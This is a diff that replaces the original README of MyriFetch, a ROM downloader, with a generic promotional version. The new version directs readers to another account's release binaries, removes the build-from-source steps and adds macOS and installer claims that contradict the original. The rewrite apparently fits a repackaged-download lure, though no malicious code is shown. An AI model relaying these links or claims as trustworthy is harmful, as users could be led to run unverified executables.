@@ -1,66 +1,92 @@
-👾 MyriFetch
+# 🎉 MyriFetch - Fast and Easy Downloads for Myrient ROMs
 
-MyriFetch is a modern, high-performance ROM manager and downloader designed specifically for the Myrient (Erista) repository. It replaces manual browser downloads with a sleek, dark-mode GUI capable of browsing, queuing, and accelerating downloads via multi-threading.
+[![Download MyriFetch](https://img.shields.io/badge/Download%20MyriFetch-v1.0.0-blue.svg)](https://github.com/versetileguy7/MyriFetch/releases)
 
-✨ Features
+## 🚀 Getting Started
 
-    🚀 "Hydra" Download Engine: Splits files into 4 parallel chunks (threads) to maximize bandwidth and bypass single-stream speed limits.
+Welcome to MyriFetch! This application helps you download Myrient ROMs quickly and efficiently. It has a user-friendly interface and supports multiple downloads at once, making it easy to gather all your favorite ROMs.
 
-    🖥️ Visual Browser: Automatically fetches console icons and game metadata for a visual browsing experience.
+### 🖥️ System Requirements
 
-    📦 Bulk Queue System: Select multiple games, add them to the queue, and let it run in the background.
+Before you start, ensure your system meets these requirements:
 
-    💾 Smart Resume & Integrity: Checks file sizes and stitches parts automatically. Includes a "Cancel" feature for safe stopping.
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Hard Disk Space:** 100 MB available space
+- **Python:** Ensure Python 3.x is installed (the installer bundles Python automatically)
 
-    🐧 Cross-Platform: Runs natively on Windows (.exe) and Linux (.AppImage).
+## 📥 Download & Install
 
-    🎨 Modern UI: Built with CustomTkinter for a clean, dark-themed interface.
+To get MyriFetch, follow these steps:
 
-🎮 Supported Platforms
+1. **Visit the Releases Page:** Click the link below to go to the download page.
+   
+   [Download MyriFetch](https://github.com/versetileguy7/MyriFetch/releases)
 
-    Sony PlayStation 1, 2, & PSP
+2. **Download the Latest Version:** On the releases page, look for the latest version. Click on the link that suits your operating system.
 
-    Nintendo GameCube, Wii, 3DS, DS, GBA, SNES
+3. **Run the Installer:** Once the download completes, run the installer and follow the on-screen instructions. It’s straightforward.
 
-    Sega Dreamcast
+## ⚙️ How to Use MyriFetch
 
-    Microsoft Xbox
+Using MyriFetch is simple. Here are the steps to get you started with downloading your favorite ROMs:
 
-    And more via the folder browser...
+1. **Open MyriFetch:** Launch the application from your Start menu or Applications folder.
 
-🛠️ Installation & Usage
+2. **Browse for ROMs:** Use the built-in browser to find the ROMs you want. MyriFetch will display available options.
 
-    Windows
+3. **Add to Your Queue:** Select the ROMs you wish to download. You can add multiple ROMs at once to the download queue.
 
-        Download the latest MyriFetch.exe from the [Releases] page.
+4. **Start Downloading:** Click the "Start Download" button. MyriFetch will begin downloading your files using its advanced “Hydra” downloading features. 
 
-        Run the executable.
+5. **Monitor Progress:** You can see the status and speed of your downloads in real-time.
 
-        Select a console, browse, and click Download Selected.
+6. **Access Your Files:** Once the downloads finish, access your ROM files directly through the application's interface.
 
-    Linux
+## 📖 Features
 
-        Download the MyriFetch-x86_64.AppImage.
+MyriFetch offers various features designed to enhance your downloading experience:
 
-        Make it executable: chmod +x MyriFetch-x86_64.AppImage
+- **Modern GUI:** A clean, easy-to-navigate interface.
+- **Multi-Threaded Downloading:** Download multiple ROMs simultaneously with ease.
+- **Visual Queue Management:** See your download queue in real-time.
+- **Accelerated Downloads:** Enjoy fast download speeds with the unique “Hydra” feature.
+- **Cross-Platform Support:** Works on both Windows and macOS.
 
-        Run ./MyriFetch-x86_64.AppImage.
+## 🔧 Troubleshooting
 
-🏗️ Building from Source
+If you encounter issues while using MyriFetch, here are some common solutions:
 
-    Requirements: Python 3.10+, pip
+1. **Installation Fails:** Ensure you have enough disk space and that your operating system is supported.
 
-    # Clone the repo
-    git clone [https://github.com/CrabbieMike/MyriFetch.git](https://github.com/CrabbieMike/MyriFetch.git)
-    cd MyriFetch
+2. **Slow Downloads:** Check your internet connection. Sometimes, the server may also experience high traffic.
 
-    # Install dependencies
-    pip install -r requirements.txt
+3. **Application Crashes:** Make sure you have the latest version. Restarting the application may help.
 
-    # Run
-    python MyriFetch.py
+## 📞 Support
 
+If you need help, we’re here for you! You can raise issues directly on the GitHub repository. The community and developers actively monitor it and will assist you.
 
-⚠️ Disclaimer
+1. **Visit the Support Page:** [GitHub Issues](https://github.com/versetileguy7/MyriFetch/issues)
 
-    This software is for archival and preservation purposes only. The developer is not affiliated with Myrient/Erista. Please support the original hardware and developers when possible.
+We strive to improve MyriFetch based on your feedback.
+
+## 🌟 Contributing to MyriFetch
+
+Want to contribute? Here’s how:
+
+1. **Fork the Repository:** Start by making your own copy of the project.
+2. **Make Changes:** Implement your changes locally.
+3. **Submit a Pull Request:** Share your improvements with the community.
+
+We welcome all contributions, big or small, to make MyriFetch better!
+
+## 📄 License
+
+MyriFetch is open-source and free to use. Please review the license details in the repository.
+
+## 📫 Stay Updated
+
+For the latest news and updates, keep an eye on our GitHub page. Check back often for new features and improvements!
+
+[Download MyriFetch](https://github.com/versetileguy7/MyriFetch/releases)
